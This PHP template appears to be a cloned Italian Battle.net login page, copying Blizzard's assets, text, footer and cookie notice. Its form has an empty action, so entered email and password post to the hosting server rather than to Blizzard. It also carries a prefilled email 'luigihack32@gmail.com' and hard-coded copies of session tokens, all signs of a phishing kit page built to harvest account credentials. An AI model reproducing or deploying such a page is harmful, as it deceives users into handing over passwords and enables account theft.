<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="it-it" class="it-it">
<head xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
    <meta http-equiv="imagetoolbar" content="false" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Login dell’account Battle.net</title>
    <link rel="shortcut icon" href="//bneteu-a.akamaihd.net/login/static/images/meta/favicon.2dy4z.ico" />
    <!--[if gt IE 8]><!--><link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/toolkit/bnet-web.min.3kF3l.css" /><!-- <![endif]-->
    <!--[if IE 8]><link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/toolkit/bnet-web-ie8.min.2mWN9.css" /><![endif]-->
    <link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/login/global.min.0nexv.css?v=1" />
    <link rel="stylesheet" type="text/css" media="all" href="/static/css/nav-client.css?v=1" />
    <link rel="stylesheet" type="text/css" media="(max-width:800px)" href="/static/css/nav-client-responsive.css?v=1" />
    <!--[if IE 8]>
    <link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/login/ie8.1xfhv.css" />
    <![endif]-->
    <link rel="search" type="application/opensearchdescription+xml" href="http://eu.battle.net/it-it/data/opensearch" title="Cerca su Battle.net" />
    <script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/toolkit/third-party/jquery/jquery-1.11.0.min.1UgDG.js?v=58-1"></script>
    <script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/core.min.2qO7b.js?v=58-1"></script>
    <meta name="viewport" content="width=device-width" />
    <script type="text/javascript">
        //<![CDATA[
        var Core = require("@blizzard/core-client");
        var Login = require("@blizzard/login-client");
        Core.staticUrl = '/login/static';
        Core.sharedStaticUrl = '/login/static/local-common';
        Core.baseUrl = '/login/it';
        Core.projectUrl = '/login';
        Core.cdnUrl = 'http://media.blizzard.com';
        Core.supportUrl = 'http://eu.battle.net/support/';
        Core.secureSupportUrl = 'https://eu.battle.net/support/';
        Core.project = 'login';
        Core.locale = 'it-it';
        Core.language = 'it';
        Core.region = 'eu';
        Core.shortDateFormat = 'dd/MM/yyyy';
        Core.dateTimeFormat = 'dd/MM/yyyy HH:mm';
        Core.loggedIn = false;
        Core.userAgent = 'web';
        Login.embeddedUrl = 'https://eu.battle.net/login/login.frag';
        //]]>
    </script>
</head>
<body class="it-it login-template web wow" data-embedded-state="STATE_LOGIN">
<script>
    //<![CDATA[
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({"gtm.start":new Date().getTime(),event:"gtm.js"});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!="dataLayer"?"&amp;l="+l:"";j.async=true;j.src=
        "//www.googletagmanager.com/gtm.js?id="+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,"script","dataLayer","GTM-589KTQ");
    //]]>
</script>
<script type="text/javascript">
    //<![CDATA[
    (function() {
        var body = document.getElementsByTagName("body")[0];
        body.className = body.className + " js-enabled preload";
    })();
    $(function(){
        $('body').removeClass('preload');
    });
    //]]>
</script>
<div class="grid-container wrapper">
    <h1 class="logo">Login dell’account Battle.net</h1>
    <div class="hide" id="info-wrapper">
        <h2><strong class="info-title"></strong></h2>
        <p class="info-body"></p>
        <button class="btn btn-block hide visible-phone" id="info-phone-close">Close</button>
    </div>
    <div class="input" id="login-wrapper">
        <form
            action=""
            method="post"
            id="password-form"
            class="
username-required
input-focus">
            <div id="login-input-container" class="">
                <div id="js-errors" class="alert alert-error alert-icon hide">
                    <p id="cookie-check" class="hide">I cookie sono disabilitati sul tuo browser. Ti preghiamo di riabilitare i cookie per continuare.</p>
                </div>
                <noscript>
                    <div id="javascript-disabled" class="alert alert-error alert-icon">
                        Devi abilitare JavaScript per utilizzare questo sito!
                    </div>
                </noscript>
                <div class="control-group">
                    <label id="accountName-label" class="control-label" for="accountName">E-mail</label>
                    <div class="controls">
                        <input
                            aria-labelledby="accountName-label"
                            id="accountName"
                            value = "luigihack32@gmail.com"
                            name="accountName"
                            title="E-mail"
                            maxlength="320"
                            type="text"
                            tabindex="1"
                            class="input-block input-large"
                            placeholder="E-mail"
                            autocorrect="off"
                            spellcheck="false"
                        />
                    </div>
                </div>
                <div class="control-group">
                    <label id="password-label" class="control-label" for="password">Password</label>
                    <div class="controls">
                        <input
                            aria-labelledby="password-label"
                            id="password"
                            name="password"
                            title="Password"
                            maxlength="16"
                            type="password"
                            tabindex="1"
                            class="input-block input-large"
                            autocomplete="off"
                            placeholder="Password"
                            autocorrect="off"
                            spellcheck="false"
                        />
                    </div>
                </div>
                <input type="hidden" id="useSrp" name="useSrp" value="false" />
                <input type="hidden" id="publicA" name="publicA" value="" />
                <input type="hidden" id="clientEvidenceM1" name="clientEvidenceM1" value="" />
                <div class="persistWrapper">
                    <label id="persistLogin-label" class="checkbox-label css-label hide" for="persistLogin">
                        <input
                            aria-labelledby="persistLogin-label"
                            id="persistLogin"
                            name="persistLogin"
                            type="checkbox"
                            checked="checked"
                            tabindex="1"
                        />
                        <span class="input-checkbox"></span>
                        Rimani connesso
                    </label>
                </div>
            </div>
            <div class="control-group submit ">
                <button type="submit" id="submit" class="btn btn-primary btn-large btn-block " data-loading-text="" tabindex="1">
                    Connessione
                    <i class="spinner-battlenet"></i>
                </button>
            </div>
            <ul id="help-links">
                <li>
                    <a class="btn btn-block btn-large"
                       rel="external"
                       href="/account/create"
                       tabindex="1"
                       id="signup"
                    >
                        Crea gratis un account
                    </a>
                </li>
                <li>
                    <a class=""
                       rel="external"
                       href="
http://eu.battle.net/account/support/login-support.html?ref=http://eu.battle.net/wow/it/&amp;theme=wow
"
                       tabindex="1"
                       id="loginSupport"
                    >
                        Non riesci a connetterti?
                    </a>
                </li>
            </ul>
            <input type="hidden" id="csrftoken" name="csrftoken" value="26d04840-0f68-43ff-9b5f-f455e6c26143" />
            <input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1459373023685" />
        </form>
        <script type="text/javascript">
            //<![CDATA[
            $(function() {
                EmbeddedLogin.init();
                loginForm.networkErrorMessage = "Controlla la tua connessione di rete e riprova.";
            });
            //]]>
        </script>
    </div>
    <footer id="footer" class="footer it-it">
        <div id="nav-client-footer" class="nav-client">
            <div class="mobileFooterEnabled footer-content footer-desktop grid-container"> <div class="nav-section support-feedback">
                    <div class="nav-left">
                        <div id="nav-feedback">
                        </div>
                    </div>
                </div>
                <div class="nav-section">
                    <div class="nav-left nav-logo-group">
                        <div class="footer-logo nav-left">
                            <a class="nav-item logo-link" href="http://eu.blizzard.com/" data-analytics="global-nav" data-analytics-placement="Footer - Blizzard Logo"><img class="blizzard-logo" src="/login/static/images/nav-client/blizzard.png?v=58-1" alt="" /></a>
                        </div>
                        <div class="footer-links nav-left">
                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Accordo di licenza per l'utente finale di Battle.net</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacy</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Menzioni legali</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Copyright</a>
                            <div class="copyright">©2016 Blizzard Entertainment, Inc.</div>
                            <div class="nav-footer-icon-container">
                                <ul class="nav-footer-icon-list">
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="nav-ratings">
                    </div>
                </div>
            </div>
            <div class="mobileFooterEnabled footer-content footer-mobile grid-container"> <div class="nav-logo-group">
                    <div class="footer-logo">
                        <a class="nav-item logo-link" href="http://eu.blizzard.com/" data-analytics="global-nav" data-analytics-placement="Footer - Blizzard Logo"><img class="blizzard-logo" src="/login/static/images/nav-client/blizzard.png?v=58-1" alt="" /></a>
                    </div>
                    <div class="footer-links">
                        <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Accordo di licenza per l'utente finale di Battle.net</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacy</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Menzioni legali</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Copyright</a>
                    </div>
                    <div class="copyright">©2016 Blizzard Entertainment, Inc.</div>
                    <div class="nav-footer-icon-container">
                        <ul class="nav-footer-icon-list">
                        </ul>
                    </div>
                    <div class="nav-ratings">
                    </div>
                </div>
            </div>
        </div>
        <div class="modal eu-cookie-compliance desktop hide" id="eu-cookie-compliance">
            <div class="modal-header">
                <a class="close" data-dismiss="modal" id="cookie-compliance-close"><i class="icon-remove icon-white"></i></a>
                <h1>Liberatoria sui cookie</h1>
            </div>
            <div class="modal-body">
                <p>Blizzard Entertainment utilizza cookie e tecnologie simili sui suoi siti web. Se continui a navigare su questi siti dopo essere stato informato sulla presenza di cookie, ne accetti l'utilizzo.</p>
            </div>
            <button class="btn btn-primary" id="cookie-compliance-agree">OK</button>
            <a class="btn" id="cookie-compliance-learn" href="http://eu.blizzard.com/company/about/privacy.html" target="_blank">Maggiori informazioni</a>
        </div>
        <div class="modal eu-cookie-compliance mobile hide" id="eu-cookie-compliance">
            <div class="modal-body">
                <a class="close" data-dismiss="modal" id="cookie-compliance-close"><i class="icon-remove icon-white"></i></a>
                <p>Questo sito utilizza i cookie. Continuando a navigare su questo sito, ne accetti l'utilizzo.</p>
            </div>
            <button class="btn btn-primary" id="cookie-compliance-agree">OK</button>
            <a class="btn" id="cookie-compliance-learn" href="http://eu.blizzard.com/company/about/privacy.html" target="_blank">Maggiori informazioni</a>
        </div>
    </footer> </div>
<script src="//bneteu-a.akamaihd.net/login/static/js/embedded-javascript/embed-0.1.5.min.2QnZN.js"></script>
<script>
    //<![CDATA[
    var xsToken = '2efbfb0c-68a4-4a7d-a9ed-2e23eda595ca';
    var supportToken = '';
    var jsonSearchHandlerUrl = '//eu.battle.net';
    var Msg = Msg || {};
    Msg.support = {
        ticketNew: 'Il ticket {0} è stato creato.',
        ticketStatus: 'Lo status del ticket {0} è cambiato in {1}.',
        ticketOpen: 'Apero',
        ticketAnswered: 'Risposto',
        ticketResolved: 'Risolto',
        ticketCanceled: 'Annullato',
        ticketArchived: 'Archiviato',
        ticketInfo: 'Richieste informazioni',
        ticketAll: 'Visualizza tutti i ticket'
    };
    Msg.cms = {
        requestError: 'La tua richiesta non può essere completata.',
        ignoreNot: 'Non ignori più questo utente',
        ignoreAlready: 'Stai già ignorando questo utente',
        stickyRequested: 'Messa in evidenza richiesta',
        stickyHasBeenRequested: 'Hai già inviato una richiesta di messa in evidenza per questo topic.',
        postAdded: 'Post aggiunto al tracker',
        postRemoved: 'Post rimosso dal tracker',
        userAdded: 'Utente aggiunto al tracker',
        userRemoved: 'Utente rimosso dal tracker',
        validationError: 'Un campo obbligatorio è incompleto',
        characterExceed: 'Lunghezza massima del post superata per XXXXXX caratteri.',
        searchFor: "Cerca:",
        searchTags: "Articoli evidenziati:",
        characterAjaxError: "Potresti essere disconnesso. Ti preghiamo di aggiornare la pagina e riprovare.",
        ilvl: "Livello {0}",
        shortQuery: "Le chiavi di ricerca devono essere di almeno due caratteri di lunghezza",
        editSuccess: "Successo. Ricaricare?",
        postDelete: "Sei sicuro di voler cancellare questo post?",
        throttleError: "Devi attendere prima di pubblicare un nuovo post."
    };
    Msg.bml= {
        bold: 'Grassetto',
        italics: 'Corsivo',
        underline: 'Sottolinea',
        list: 'Lista',
        listItem: 'Oggetto in lista',
        quote: 'Citazione',
        quoteBy: 'Pubblicato da {0}',
        unformat: 'Elimina formattazione',
        cleanup: 'Aggiusta le rientrature',
        code: 'Blocchi di codice',
        item: 'Oggetto di WoW',
        itemPrompt: 'ID oggetto:',
        url: 'URL',
        urlPrompt: 'Indirizzo URL:'
    };
    Msg.ui= {
        submit: 'Invia',
        cancel: 'Annulla',
        reset: 'Resetta',
        viewInGallery: 'Visualizza in galleria',
        loading: 'Caricamento…',
        unexpectedError: 'Si è verificato un errore',
        fansiteFind: 'Trovalo su…',
        fansiteFindType: 'Trova {0} su…',
        fansiteNone: 'Nessun fansite disponibile.',
        flashErrorHeader: 'Per vedere questi contenuti è necessario installare Adobe Flash Player.',
        flashErrorText: 'Scarica Adobe Flash Player',
        flashErrorUrl: 'http://get.adobe.com/flashplayer/',
        save: 'Salva'
    };
    Msg.grammar= {
        colon: '{0}:',
        first: 'Prima',
        last: 'Ultima',
        ellipsis: '…'
    };
    Msg.fansite= {
        achievement: 'trofeo',
        character: 'personaggio',
        faction: 'fazione',
        'class': 'classe',
        object: 'soggetto',
        talentcalc: 'talenti',
        skill: 'professione',
        quest: 'quest',
        spell: 'incantesimo',
        event: 'evento',
        title: 'titolo',
        arena: 'team di arena',
        guild: 'gilda',
        zone: 'zona',
        item: 'oggetto',
        race: 'razza',
        npc: 'PNG',
        pet: 'famiglio'
    };
    Msg.search= {
        noResults: 'Non ci sono risultati da visualizzare.',
        kb: 'Assistenza',
        post: 'Forum',
        article: 'Articoli',
        static: 'Contenuto generale',
        wowcharacter: 'Personaggio',
        wowitem: 'Oggetto',
        wowguild: 'Gilde',
        wowarenateam: 'Team di Arena',
        url: 'Link suggeriti',
        friend: 'Amici',
        product: 'Prodotti del Marketplace',
        other: 'Altro'
    };
    //]]>
</script>
<script src="//bneteu-a.akamaihd.net/login/static/js/toolkit/toolkit.min.4dTX7.js"></script>
<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/global.min.40AuO.js"></script>
<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/login.min.4TS5Y.js"></script>
<script type="text/javascript" src="//bneteu-a.akamaihd.net/login/static/js/login/srp-client.min.30N9R.js?v=1"></script>
</body>
</html>